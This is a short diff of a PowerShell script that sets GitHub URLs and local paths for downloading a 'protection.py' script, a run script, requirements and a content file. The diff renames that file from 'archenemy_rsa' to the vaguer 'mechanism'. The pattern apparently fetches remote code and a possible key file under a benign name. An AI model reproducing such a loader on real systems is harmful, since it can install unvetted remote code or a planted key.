@@ -45,12 +45,12 @@ if (-not (Test-Path -Path $outDirectory)) {
 $repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 $runUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/run_protection.ps1"
 $requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
-$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/archenemy_rsa"
+$contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/mechanism"
 
 $scriptPath = "${outDirectory}/protection.py"
 $runPath = "${outDirectory}/run_protection.ps1"
 $requirementsPath = "${outDirectory}/requirements.txt"
-$contentPath = "${outDirectory}/archenemy_rsa"
+$contentPath = "${outDirectory}/mechanism"
 
 # Check if scriptPath already exists
 if (Test-Path $scriptPath) {
